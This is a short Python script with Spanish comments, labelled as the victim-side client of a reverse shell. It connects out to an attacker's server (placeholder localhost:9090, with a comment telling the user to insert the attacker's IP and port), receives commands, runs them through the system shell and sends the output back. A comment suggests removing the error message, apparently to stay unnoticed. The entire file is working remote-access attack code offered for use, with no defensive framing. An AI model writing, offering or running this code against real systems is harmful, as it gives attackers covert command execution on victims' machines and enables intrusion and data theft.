#Victima

import sys , subprocess , socket , os

victima = socket.socket()
victima.connect(("localhost" , 9090)) # Pon el puerto y ip del servidor atacante

os.chdir(os.getcwd())

while True:
	try:
		victima.sendall(os.getcwd().encode("utf-8"))
		com = victima.recv(1024).decode("utf-8")
		if com.startswith("cd"):
			os.chdir(com[3:])
			victima.sendall(" ".encode("utf-8"))
		else:
			s = subprocess.run(com, capture_output=True, text=True , shell=True)
			victima.sendall(s.stdout.encode("utf-8"))
	except Exception as err:
		print("Un error a ocurrido " , err) #Aca puedes quitar el print
		sys.exit(1)
